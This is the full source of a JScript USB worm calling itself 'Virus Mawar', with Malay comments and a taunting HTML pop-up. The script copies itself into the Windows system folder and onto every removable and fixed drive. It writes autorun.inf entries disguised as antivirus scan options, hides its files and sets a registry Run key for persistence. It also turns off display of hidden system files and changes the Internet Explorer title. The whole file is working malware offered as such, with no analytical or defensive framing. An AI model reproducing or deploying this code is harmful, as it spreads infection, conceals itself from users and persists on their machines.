// DarkSerenade Music.. beautiful

var ThisFileName = "\\VirusMwrdy.js";







var Mwrdy ="\\SpaQ - The Novel.html"







var AutorunFileName = "\\AutoRun.inf";







var CRLF = "\r\n";







var RemovableDrive = 1;







var FixedDrive = 2;







var DelayStart = 1000;







var DelayProcess = 1000;







var DelayFixedDrive = 60000;















// Global Variable







var ThisText,AutorunText,tf,RegPath,MwrdyText;











AutorunText = "[autorun]" + CRLF;







AutorunText = AutorunText + "Open = wscript.exe " + ThisFileName + CRLF;







AutorunText = AutorunText + "shellexecute = wscript.exe " + ThisFileName + CRLF;







AutorunText = AutorunText + "shell\\Open\\command = wscript.exe " + ThisFileName + CRLF;







AutorunText = AutorunText + "shell\\Explore\\command = wscript.exe " + ThisFileName + " -Clicked" + CRLF;







AutorunText = AutorunText + "shell\\AutoPlay\\command = wscript.exe " + ThisFileName + CRLF;







AutorunText = AutorunText + "shell\\Scan for Viruses\\command = wscript.exe " + ThisFileName + CRLF;







AutorunText = AutorunText + "shell\\Scan with Norton AntiVirus\\command = wscript.exe " + ThisFileName + CRLF;







AutorunText = AutorunText + "shell\\Scan with AVG\\command = wscript.exe " + ThisFileName + CRLF;







AutorunText = AutorunText + "shell = Explore";



MwrdyText = "<SCRIPT LANGUAGE='JavaScript'>" 

MwrdyText = MwrdyText + "alert('HEY YOU..');" 

MwrdyText = MwrdyText + "alert('Ohoo.. SpaQ la konon..');"
MwrdyText = MwrdyText + "alert('Wanna know something?');"
MwrdyText = MwrdyText + "alert('Virus Mawar is back and its attacking ur system!');"
MwrdyText = MwrdyText + "alert('Better format ur computer baby.. Adios!!');"
MwrdyText = MwrdyText + "alert('Oh yeah... mail me.. carboflux@yahoo.com');"
MwrdyText = MwrdyText + "</SCRIPT>"
MwrdyText = MwrdyText + "Oh my... aku benci sgguh tgk cter SpaQ yg pnuh kegedikan anak2 muda tu..  hmm.. insafla.. hey.. aku pun insaf jgk...sb 2 wat virus ni  "















var fs = new ActiveXObject("Scripting.FileSystemObject");







var ThisPath = fs.GetFile(WScript.ScriptFullname);







var check = ThisPath.Drive.DriveType;















var WinPath = new String(fs.GetSpecialFolder(0)); // Windows Folder







var SysPath = new String(fs.GetSpecialFolder(1)); // System32 Folder







var aShell = new ActiveXObject("WScript.Shell");















// Open the explorer if double clicked







var aArgs = WScript.Arguments;







for (var i = 0; i < aArgs.length; i++)







{







    if(aArgs(i) == "-Clicked")







    {







        aShell.Run(WinPath + "\\explorer.exe " + WScript.ScriptFullname.substr(0,3)); 







    }







}















WScript.Sleep(DelayStart);















// copy diri sendiri save kat win dir







var text;







try







{







    text = ThisPath.OpenAsTextStream(1,-2); //1 - open for read, -2 using syetem default encoding







    ThisText = "";







    while (!text.AtendOfStream) // copy this file to the ThisText







    {







        ThisText = ThisText + text.ReadLine();







        ThisText = ThisText + "\n";







    }







} catch(e){}















do







{







    try







    {







        if (fs.FileExists(SysPath + ThisFileName))







        {







            tf = fs.GetFile(SysPath + ThisFileName);







            tf.Attributes = 32;







		



        }







        tf = fs.CreateTextFile(SysPath + ThisFileName, 2, true); // overite n unicode







        tf.Write(ThisText);







        tf.Close();







        tf = fs.GetFile(SysPath + ThisFileName);







        tf.Attributes = 39;







	



    } catch(e){}















    var DrivesEnum = new Enumerator(fs.Drives);







    var aDrive;







    for (; !DrivesEnum.atEnd(); DrivesEnum.moveNext())







    {







        aDrive = DrivesEnum.item();







        if ((aDrive.DriveType == RemovableDrive || aDrive.DriveType == FixedDrive) && aDrive.Path != "A:")  // 1 - Removable, 2 - Fixed







        {







            // copy diri sendiri save kat flash drive







            try







            {







                if (fs.FileExists(aDrive.Path + ThisFileName))







                {







                    tf = fs.GetFile(aDrive.Path + ThisFileName);







                    tf.Attributes = 32;        







					







                }







				







                tf = fs.CreateTextFile(aDrive.Path + ThisFileName, 2, true);







                tf.Write(ThisText);







                tf.Close();







                tf = fs.GetFile(aDrive.Path + ThisFileName);







                tf.Attributes = 39;











            } catch(e){}







    // mwar punya    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++    



				try







            	{







                if (fs.FileExists(aDrive.Path + Mwrdy))







                {







                    tf = fs.GetFile(aDrive.Path + Mwrdy);







                    tf.Attributes = 32;        







					







				}



    			tf = fs.CreateTextFile(aDrive.Path + Mwrdy, 2, true);

                tf.Write(MwrdyText);

                tf.Close();

                tf = fs.GetFile(aDrive.Path + Mwrdy);

                tf.Attributes = 32;







            } catch(e){}



            // copy autorun.inf save kat flash drive







            try







            {







                if (fs.FileExists(aDrive.Path + AutorunFileName))







                {







                    tf = fs.GetFile(aDrive.Path + AutorunFileName);







                    tf.Attributes = 32;







                }







                tf = fs.CreateTextFile(aDrive.Path + AutorunFileName, 2, true);







                tf.Write(AutorunText);







                tf.Close();







                tf = fs.GetFile(aDrive.Path + AutorunFileName);







                tf.Attributes = 39;







            } catch(e){}







        }







    }















    // set registry







    try







    {







        WScript.Sleep(DelayProcess);







        RegPaths = "HKEY_LOCAL_MACHINE";







        RegPaths = RegPaths + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";







        RegPaths = RegPaths + "\\Muse_Virus";







        aShell.RegWrite(RegPaths, "wscript.exe " + SysPath + ThisFileName, "REG_SZ");







        RegPathss = "HKEY_CURRENT_USER";







        RegPathss = RegPathss + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";







        RegPathss = RegPathss + "\\ShowSuperHidden";







        aShell.RegWrite(RegPathss, 0, "REG_DWORD");







        RegPath = "HKEY_CURRENT_USER";







        RegPath = RegPath + "\\Software\\Microsoft\\Internet Explorer\\Main";







        RegPath = RegPath + "\\Window Title";







        aShell.RegWrite(RegPath, "Virus Mawar Is Back, Now With Muse, and Matt Bellamy Rocks ++++++++++++++++++", "REG_SZ");







    } catch(e){}















    // wait 1 min for fixed drv







    if (check != RemovableDrive)







        WScript.Sleep(DelayFixedDrive);















} while(check != RemovableDrive && WScript.ScriptFullname.substr(0,3).toLowerCase() == SysPath.substr(0,3).toLowerCase())























if (check == RemovableDrive)







    aShell.Run("wscript.exe " + SysPath + ThisFileName);







	







